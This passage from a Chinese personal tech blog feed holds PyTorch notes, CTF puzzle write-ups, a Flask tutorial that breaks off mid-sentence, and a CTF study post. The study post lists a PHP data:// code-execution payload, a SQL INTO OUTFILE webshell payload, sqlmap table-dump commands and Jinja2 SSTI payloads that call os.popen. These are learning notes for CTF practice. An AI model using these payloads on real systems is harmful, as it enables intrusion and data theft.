class="number">100</span>):</span><br><span class="line">    writer.add_scalar(<span class="string">&quot;y=5x&quot;</span>,<span class="number">3</span>*i,i)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210913162217.png"></p><p>最后关闭函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">writer.close()</span><br></pre></td></tr></table></figure><h2 id="transform使用"><a href="#transform使用" class="headerlink" title="transform使用"></a>transform使用</h2><p>transform是pytorch中的一个工具箱，里面有很多的功能工具</p><p>一般来说是用来对图片做一些处理，输入一个图片，输出一个结果</p><h3 id="用法（以totensor-为例）"><a href="#用法（以totensor-为例）" class="headerlink" title="用法（以totensor()为例）"></a>用法（以totensor()为例）</h3><p>首先弄一个对象，transform的对象，再输入一个图片类型 就可以对其操作，进行输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from torch.utils.tensorboard import SummaryWriter</span><br><span class="line">import cv2</span><br><span class="line">from torchvision.transforms import transforms</span><br><span class="line"></span><br><span class="line">img_path&#x3D;&#39;data&#x2F;train&#x2F;ants_img&#x2F;5650366_e22b7e1065.jpg&#39;</span><br><span class="line">writer &#x3D; SummaryWriter(&#39;logs&#39;)</span><br><span class="line">img &#x3D; cv2.imread(img_path)</span><br><span class="line"></span><br><span class="line">tensor_trans &#x3D; transforms.ToTensor()</span><br><span class="line">trans_img &#x3D; tensor_trans(img)</span><br><span class="line"></span><br><span class="line">writer.add_image(&#39;test1&#39;, trans_img)</span><br><span class="line"></span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure><p>还有很多其他的，compose()主要是合并，resize()是改变图片大小</p><p>就懒得讲了</p><h1 id="pytorch数据集的读取"><a href="#pytorch数据集的读取" class="headerlink" title="pytorch数据集的读取"></a>pytorch数据集的读取</h1><h2 id="torchvision中的datasets和DataLoader"><a href="#torchvision中的datasets和DataLoader" class="headerlink" title="torchvision中的datasets和DataLoader"></a>torchvision中的datasets和DataLoader</h2><p>这是一个图片的数据集的模块，有关图片的数据的读取利用都是用这个模块</p><h3 id="dataset用法"><a href="#dataset用法" class="headerlink" title="dataset用法"></a>dataset用法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dataset_transform = torchvision.transforms.Compose([</span><br><span class="line">    torchvision.transforms.ToTensor()</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">train_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./dayo2/dataset&#x27;</span>,train=<span class="literal">True</span>,transform=dataset_transform,download=<span class="literal">True</span>)</span><br><span class="line">//train 是指算不算训练集，transform是对这个数据集开始使用的工具</span><br><span class="line"></span><br><span class="line">test_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./dayo2/dataset&#x27;</span>,train=<span class="literal">False</span>,transform=dataset_transform,download=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="DataLoader用法"><a href="#DataLoader用法" class="headerlink" title="DataLoader用法"></a>DataLoader用法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">test_loader = DataLoader(dataset=test_set, batch_size=<span class="number">64</span>, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">False</span>)</span><br><span class="line">//参数分别是之前的数据集，batch_size是一次性取出来的数目，shuffle是指是否两次之间要打乱抽取，drop_last为<span class="literal">False</span>指最后不足<span class="number">64</span>的要不要舍弃</span><br><span class="line">writer = SummaryWriter(<span class="string">&quot;day03_log&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    step=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> test_loader:</span><br><span class="line">        img,target = data</span><br><span class="line">        writer.add_images(<span class="string">&quot;epoch:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch),img,global_step=step)</span><br><span class="line">        step +=<span class="number">1</span></span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210914093625.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深度学习的概念&quot;&gt;&lt;a href=&quot;#深度学习的概念&quot; class=&quot;headerlink&quot; title=&quot;深度学习的概念&quot;&gt;&lt;/a&gt;深度学习的概念&lt;/h1&gt;&lt;p&gt;深度学习从广义上来讲就是程序可以自己学习自己的意思。是指一个已经写好的代码程序经过大量的数据使得自身</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="深度学习" scheme="https://thanyi.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>关于实训中的一些小知识</title>
    <link href="https://thanyi.github.io/2021/07/11/012%E5%85%B3%E4%BA%8E%E5%AE%9E%E8%AE%AD%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/"/>
    <id>https://thanyi.github.io/2021/07/11/012%E5%85%B3%E4%BA%8E%E5%AE%9E%E8%AE%AD%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</id>
    <published>2021-07-11T08:59:53.000Z</published>
    <updated>2021-08-14T09:42:09.254Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于一些常用的payload"><a href="#关于一些常用的payload" class="headerlink" title="关于一些常用的payload"></a>关于一些常用的payload</h2><p>这是一个在网页中输入的可以保证使用的payload，通过php文件可以看到很多东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx/?***=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> *** <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>利用sql语句注入一句话木马的payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php *** ?&gt;&quot; <span class="keyword">into</span> outfile &quot;路径&quot;</span><br></pre></td></tr></table></figure><h2 id="linux的常用命令"><a href="#linux的常用命令" class="headerlink" title="linux的常用命令"></a>linux的常用命令</h2><p>查找想要查找从根目录 / 开始的文件名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name &quot;文件名&quot;</span><br></pre></td></tr></table></figure><p>查找这个文件后面的所有文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f</span><br></pre></td></tr></table></figure><h2 id="php中的一些基础函数"><a href="#php中的一些基础函数" class="headerlink" title="php中的一些基础函数"></a>php中的一些基础函数</h2><h3 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump()函数"></a>var_dump()函数</h3><p>这个函数是用来表示一个函数的类型和大小的</p><h3 id="mb-strpos-函数和strpos-函数"><a href="#mb-strpos-函数和strpos-函数" class="headerlink" title="mb_strpos()函数和strpos()函数"></a>mb_strpos()函数和strpos()函数</h3><p>这个函数是用来用在要检测在字符串中的子串第一次出现的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(mb_strpos(<span class="string">&#x27;开始23测试ceshi&#x27;</span>, <span class="string">&#x27;测试&#x27;</span>));</span><br><span class="line"><span class="keyword">int</span>(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>注意：这个是按照字来处理的，也就是说是两个字节</p><p>strpos()函数是差不多类似的，但是就是按照字节来算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(strpos(<span class="string">&#x27;开始23测试ceshi&#x27;</span>, <span class="string">&#x27;测试&#x27;</span>));</span><br><span class="line"><span class="keyword">int</span>(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>并且如果没有这个子串，那就是整个字符串的长度</p><h3 id="in-array-x-y-函数"><a href="#in-array-x-y-函数" class="headerlink" title="in_array($x, $y)函数"></a>in_array($x, $y)函数</h3><p>注意顺序，这个是表示x在y中</p><h2 id="sqlmap的post注入用法"><a href="#sqlmap的post注入用法" class="headerlink" title="sqlmap的post注入用法"></a>sqlmap的post注入用法</h2><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>sqlmap的post注入需要一个参数是注入点的参数</p><p>我们可以使用形如</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">111</span>.<span class="number">200</span>.<span class="number">241</span>.<span class="number">244</span>:<span class="number">50506</span>/ --data search=<span class="number">1</span> -D news -T secret_table --dump </span><br></pre></td></tr></table></figure><p>这样的形式直接获得数据</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>先在burp中把请求保存成本地文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 事前在burpsuite中保存成文件的数据 -p 参数 -D 库名 -T 表名 --dump </span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\ethanyi\Desktop\post.txt -p search -D news -T secret_table --dump </span><br></pre></td></tr></table></figure><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式有些是以下方格式（在javascript的match函数中）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^hfuhfa&#x2F;</span><br><span class="line">&#x2F;hsofhsudo$&#x2F;</span><br></pre></td></tr></table></figure><p>其中^是表示了匹配开头是那个的样子</p><p>$表示匹配的末尾是上方那个字符串</p><h2 id="javascript的eval函数"><a href="#javascript的eval函数" class="headerlink" title="javascript的eval函数"></a>javascript的eval函数</h2><p>eval()函数中的参数是一个字符串，这个字符串是可以执行的代码，eval函数的意义就是使用这个代码来执行</p><h2 id="关于php"><a href="#关于php" class="headerlink" title="关于php"></a>关于php</h2><h3 id="php的-和"><a href="#php的-和" class="headerlink" title="php的==和==="></a>php的==和===</h3><p>==在php中是指数值比较</p><p>===在php中是数值和类型比较</p><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$b</span>)</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;true&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;false&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;true&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;false&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>结果分别是true、false</p><p>除此之外：php中，非数值性的字符串和数字比较时，字符串会先转变为数字0，再来和数字比较</p><p>其中：</p><p>1、形如”aa111111”的字符串，会直接变为0</p><p>2、形如”1111aa”的字符串，会变成1111</p><p>3、形如”aaa111aaa”的字符串，会变成0</p><p>4、形如”111aaa111”的字符串，会变成111</p><p>(别问，问就是试出来的)</p><h2 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h2><p>SSTI（Server-Side Template Injection）服务器端模板注入</p><h3 id="python-flask模板"><a href="#python-flask模板" class="headerlink" title="python  flask模板"></a>python  flask模板</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在flask中：使用Jinja2模板引擎，&#123;&#123;&#125;&#125;是变量包裹标识符。&#123;&#123;&#125;&#125;并不仅仅可以传递变量，还可以执行一些简单的表达式。</span><br></pre></td></tr></table></figure><h3 id="一些payload或者说魔术方法"><a href="#一些payload或者说魔术方法" class="headerlink" title="一些payload或者说魔术方法"></a>一些payload或者说魔术方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类  &#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>有用的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;</span><br><span class="line">os&#39;].popen(&#39;ls&#39;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;</span><br><span class="line">os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p>详情可以看<a href="https://www.freebuf.com/column/187845.html%EF%BC%8C%E6%88%91%E8%A7%89%E5%BE%97%E5%86%99%E5%BE%97%E5%BE%88%E8%AF%A6%E7%BB%86">https://www.freebuf.com/column/187845.html，我觉得写得很详细</a></p><h3 id="os-system和-os-popen"><a href="#os-system和-os-popen" class="headerlink" title="os.system和 os.popen"></a>os.system和 os.popen</h3><p>这两句前者返回 <strong>退出状态码</strong> , 后者 <strong>以file 形式</strong> 返回 <strong>输出内容</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于一些常用的payload&quot;&gt;&lt;a href=&quot;#关于一些常用的payload&quot; class=&quot;headerlink&quot; title=&quot;关于一些常用的payload&quot;&gt;&lt;/a&gt;关于一些常用的payload&lt;/h2&gt;&lt;p&gt;这是一个在网页中输入的可以保证使用的payl</summary>
      
    
    
    
    <category term="ctf" scheme="https://thanyi.github.io/categories/ctf/"/>
    
    <category term="小结" scheme="https://thanyi.github.io/categories/ctf/%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="ctf" scheme="https://thanyi.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf基础题</title>
    <link href="https://thanyi.github.io/2021/07/10/011ctf%E5%9F%BA%E7%A1%80%E9%A2%98/"/>
    <id>https://thanyi.github.io/2021/07/10/011ctf%E5%9F%BA%E7%A1%80%E9%A2%98/</id>
    <published>2021-07-10T08:59:53.000Z</published>
    <updated>2021-08-14T09:38:31.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目1：掀桌子"><a href="#题目1：掀桌子" class="headerlink" title="题目1：掀桌子"></a>题目1：掀桌子</h2><h4 id="菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子-╯°□°）╯︵-┻━┻"><a href="#菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子-╯°□°）╯︵-┻━┻" class="headerlink" title="菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻"></a>菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻</h4><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>我们可以看出这个“c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1…”这种格式，就是一个“\xc8\xe9..”这个样子的格式</p><p>所以这个好像是和字节ascii码有关，所以我们可以用把这个报文分组，这是个字节流</p><p>所以把这个字节流变化一下</p><p>变化的代码：</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210712190545.png"></p><p>也就是把字节流两两分组，又因为ascii码是8位并且首位是0，所以减128</p><p>所以就是在通过这个来变为flag</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210712190526.png"></p><p>解决</p><h2 id="题目2-ext3"><a href="#题目2-ext3" class="headerlink" title="题目2 ext3"></a>题目2 ext3</h2><h4 id="今天是菜狗的生日，他收到了一个linux系统光盘（附带了一个文件）"><a href="#今天是菜狗的生日，他收到了一个linux系统光盘（附带了一个文件）" class="headerlink" title="今天是菜狗的生日，他收到了一个linux系统光盘（附带了一个文件）"></a>今天是菜狗的生日，他收到了一个linux系统光盘（附带了一个文件）</h4><p>这个题是关于winhex运用的题，我已经很久没有用过winhex了，这次又把它重新安装了回来</p><h4 id="注：”ext”这个是指ext文件系统，即linux文件系统"><a href="#注：”ext”这个是指ext文件系统，即linux文件系统" class="headerlink" title="注：”ext”这个是指ext文件系统，即linux文件系统"></a>注：”ext”这个是指ext文件系统，即linux文件系统</h4><h4 id="winhex的一些重点"><a href="#winhex的一些重点" class="headerlink" title="winhex的一些重点"></a>winhex的一些重点</h4><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210712190747.png"></p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>这个东西虽然说是和linux系统相关，但我现在实在是不是很会linux，所以就先用上这个winhex了</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210712200722.png"></p><p>我真是服了！！有个wp上说可以直接改后缀名解压，艹</p><p>哦但是不行，我试了反正不行</p><p>但可以用360压缩，就很厉害，真的</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210713000500.png"></p><p>发现是个base64然后在解密就好了</p><h2 id="题目3-simpleRAR"><a href="#题目3-simpleRAR" class="headerlink" title="题目3 simpleRAR"></a>题目3 simpleRAR</h2><h4 id="菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块-ps-双图层"><a href="#菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块-ps-双图层" class="headerlink" title="菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)"></a>菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)</h4><p>这个附件是一个压缩包，可笑的是用bandzip和360压缩都只能解出一个</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210713094735.png"></p><p>只有用winRAR的时候才有</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210814173749.png"></p><p>然后在网上搜rar压缩文件的格式，发现</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210713113434.png"></p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210814173812.png"></p><p>也就是说每个rar文件都是，先有两个字节是CRC校验码（循环冗余校验码？？），后有一个字节属于类型区别，我们要改的就是这个</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210713113725.png"></p><p>改完之后用winhex打开发现是个gif，所以把后缀改了，但是打开还是个空的</p><p>所以我们又要用一个新软件，一个图片隐写的软件——stegsolve</p><p>在里面打开（不知道为什么我这里不能直接吧图片拖进去），然后发现在其中一个r通道里面有半块二维码</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210713124409.png"></p><p>把那个gif文件放在ps里面又知道他有两个图层（ps一打开就有）</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210713195018.png"></p><p>把这两个图层导出再通过stegsolve就可以匹配了</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210713195003.png"></p><p>再用ps来p图</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210713195732.png"></p><p>一扫就知道flag了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目1：掀桌子&quot;&gt;&lt;a href=&quot;#题目1：掀桌子&quot; class=&quot;headerlink&quot; title=&quot;题目1：掀桌子&quot;&gt;&lt;/a&gt;题目1：掀桌子&lt;/h2&gt;&lt;h4 id=&quot;菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5</summary>
      
    
    
    
    <category term="ctf" scheme="https://thanyi.github.io/categories/ctf/"/>
    
    <category term="基础" scheme="https://thanyi.github.io/categories/ctf/%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="-题目" scheme="https://thanyi.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>flask框架的使用教程</title>
    <link href="https://thanyi.github.io/2021/06/05/009flask/"/>
    <id>https://thanyi.github.io/2021/06/05/009flask/</id>
    <published>2021-06-04T16:00:00.000Z</published>
    <updated>2021-06-05T12:41:00.975Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p>这个是关于我们要做的项目的学习</p><p>我们用了flask框架</p><h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><p>虚拟环境的配置保证了到时候项目交接的时候</p><p>让别的组员不用也在pip上面 配置很多东西</p><p>直接就放在这个项目包里面了</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>在flask的文件项目里面可以自己新建一个settings.py</p><p>里面就是普通的关于配置的书写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV &#x3D;&quot;development&quot;</span><br><span class="line">DEBUG &#x3D; True</span><br></pre></td></tr></table></figure><p>然后在app.py中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config.from_object(settings)</span><br></pre></td></tr></table></figure><p>就可以开始实施配置文件了</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>在pycharm中弄了flask项目以后，有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure><p>这个是一个装饰器，也就是可以翻译成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span>    </span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"> </span><br><span class="line"> app.add_url_rule(<span class="string">&#x27;/&#x27;</span>,view_func=index)</span><br></pre></td></tr></table></figure><p>将路由和这个视图函数绑定在一起</p><p>注：app是一个Flask类弄出的对象，是整个flask项目的中心</p><p>具有各种和项目相关的方法和变量</p><h3 id="路由的变量规则"><a href="#路由的变量规则" class="headerlink" title="路由的变量规则"></a>路由的变量规则</h3><p>路由可以在里面加入一些变量，放入在路由里面的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&lt;str:key&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure><p>key是一个变量，也可以不叫key，然后这个路由里面一旦涉及一个&lt;..&gt;变量，所对应的函数就要多一个参数,默认是字符串类型  </p><p>这些类型就是那些数据类型</p><p>还有一个path和uuid类型，了解就行</p><h3 id="路由中url重定向行为"><a href="#路由中url重定向行为" class="headerlink" title="路由中url重定向行为"></a>路由中url重定向行为</h3><p>在路由中，如果我的定义是最后有个”/“</p><p>比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure><p>它会具有重定向。也就是说如果我在浏览器里面是写的”/index/“</p><p>它也会重定向到”/index”这里，顺便一说此时的返回状态码是30x(也就是说302、308)这些，和重定向有关的状态码</p><h3 id="路由的返回值"><a href="#路由的返回值" class="headerlink" title="路由的返回值"></a>路由的返回值</h3><p> return的那些字符串都是进入了Respone中，Response（“返回的字符串”）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure><p>这个return  ‘Hello World!’</p><p>等价于 return Response (‘Hello World!’)</p><p>这个Respone中的参数就是web中response中的一些参数</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210605203610.png"></p><p>return 的返回值可以是元组，在这个情况下后面的跟着的可以是响应码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span>,<span class="number">404</span></span><br></pre></td></tr></table></figure><p>那这个页面就会直接变成404的样子，也就是在响应报文中有个404了</p><h3 id="关于make-response"><a href="#关于make-response" class="headerlink" title="关于make_response"></a>关于make_response</h3><p>这个话题我还不知道放在哪里我就直接放在这个路由版块了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = make_response(<span class="string">&quot;这是一个文本&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个创建了一个response对象，在视图函数里面就可以直接返回这个对象，这就是一个响应对象 </p><p>还可以通过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 